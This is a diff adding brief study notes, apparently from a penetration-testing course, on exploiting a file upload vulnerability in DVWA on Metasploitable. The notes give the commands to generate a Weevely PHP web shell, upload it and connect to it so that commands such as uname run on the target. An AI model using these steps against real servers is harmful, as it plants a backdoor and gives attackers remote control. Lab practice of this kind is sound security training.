@@ -1,0 +1,39 @@
+File Upload Vulnerability
+
+Simple type of vulnerabilities
+Allow users to upload executable files such as php
+
+upload a php shell or backdoor, ex: weevly
+1> Generate backdoor > weevly generate [password][file name]
+2> Upload Generated file
+3> Connect to it > weevly [url to file] [password]
+4> find out how to use weevly >help
+
+go to metasploitable
+
+ip/dvwa
+upload
+
+upload image file 
+../ means one directory back
+
+upload a php file
+
+in kali machine
+weevely generate 123456 /root/shell.php
+
+pwd
+
+ls
+browse root/shell.php
+
+use ip/dvwa/hackable/uploads/shell.php
+
+in kali
+weevly http://ip/dvwa/hackable/uploads/shell.php 123456
+
+any commands will work on targed computer
+pwd
+
+uname -a
+help in weevly
